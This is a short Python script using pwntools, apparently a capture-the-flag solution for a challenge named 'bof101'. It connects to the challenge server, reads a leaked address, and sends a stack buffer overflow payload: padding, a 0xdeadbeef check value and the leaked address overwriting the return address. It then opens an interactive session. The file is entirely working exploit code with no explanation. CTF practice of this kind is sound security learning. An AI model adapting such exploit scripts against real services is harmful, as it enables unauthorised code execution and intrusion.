#!/usr/bin/env python3

from pwn import *

#s = process("./bof101")
s = remote("bof101.sstf.site", 1337)

padding = "A" * 0x8C
check = 0xdeadbeef

payload = padding.encode()
payload += p32(check)

s.recvuntil(": ")
flag = int(s.recvline().strip(b'\n').decode(), 16)
payload += p64(flag)
s.sendlineafter(": ", payload)

s.interactive()
